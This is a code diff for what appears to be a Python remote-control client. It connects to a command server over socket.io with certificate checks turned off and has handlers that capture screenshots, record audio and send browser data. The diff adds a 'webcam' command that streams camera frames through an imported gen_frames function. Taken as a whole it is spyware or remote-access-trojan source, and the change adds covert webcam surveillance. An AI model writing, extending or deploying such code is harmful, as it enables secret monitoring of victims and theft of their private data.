@@ -5,7 +5,7 @@ import time
 import socketio
 
 from database_utils import send_browser_data
-from media_utils import take_and_send_screenshot, record_and_send_audio
+from media_utils import take_and_send_screenshot, record_and_send_audio, gen_frames
 
 sio = socketio.Client(reconnection=True, reconnection_attempts=5, reconnection_delay=2, ssl_verify=False)
 
@@ -53,7 +53,8 @@ def command(data):
         record_and_send_audio(duration, sio)
     elif command == 'browserdata':
         send_browser_data(sio)
-
+    elif command == 'webcam':
+        gen_frames(sio)
 
 def attempt_reconnect():
     while not sio.connected:
